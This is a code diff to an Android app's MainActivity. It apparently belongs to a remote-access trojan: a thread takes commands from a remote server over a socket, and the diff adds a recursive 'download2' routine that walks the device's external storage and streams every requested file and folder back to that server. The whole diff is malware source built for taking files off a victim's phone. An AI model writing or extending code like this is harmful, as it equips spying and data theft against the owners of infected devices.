@@ -50,7 +50,7 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
-  class connect extends Thread {
+   class connect extends Thread {
 
         String currentpath = Environment.getExternalStorageDirectory().toString();
 
@@ -194,8 +194,11 @@ public class MainActivity extends AppCompatActivity {
             } else if (cmd.startsWith("pwd")) {
                 output = currentpath;
             } else if (cmd.startsWith("download ")) {
+                send(server, "downloading");
 
-               output = download(server, cmd);
+                cmd = cmd.split("download ")[1];
+               download2(server, cmd);
+               output = "donwload complete";
 
             }
             return output;
@@ -237,6 +240,42 @@ public class MainActivity extends AppCompatActivity {
             }
 
             return output;
+
+        }
+
+        @RequiresApi(api = Build.VERSION_CODES.O)
+        void download2(Socket server, String requested_file){
+            String output = "null";
+
+            String file_to_download_loc = currentpath + "/" + requested_file;
+            File file = new File(file_to_download_loc);
+
+
+
+            if (file.isDirectory()) {
+
+                List<String> all_files = getallfiles(file);
+                send(server, "dir");
+
+                send(server, requested_file);
+
+                send(server, "number_of_files: " + all_files.size());
+
+                for (String file1 : all_files){
+
+                    download2(server, requested_file + "/" + file1);
+
+                }
+            }
+            else if (file.isFile()) {
+                send(server, "file");
+                downloadfile(server, file_to_download_loc);
+                recv(server);
+                send(server, "ok");
+
+
+            }
+
 
         }
 
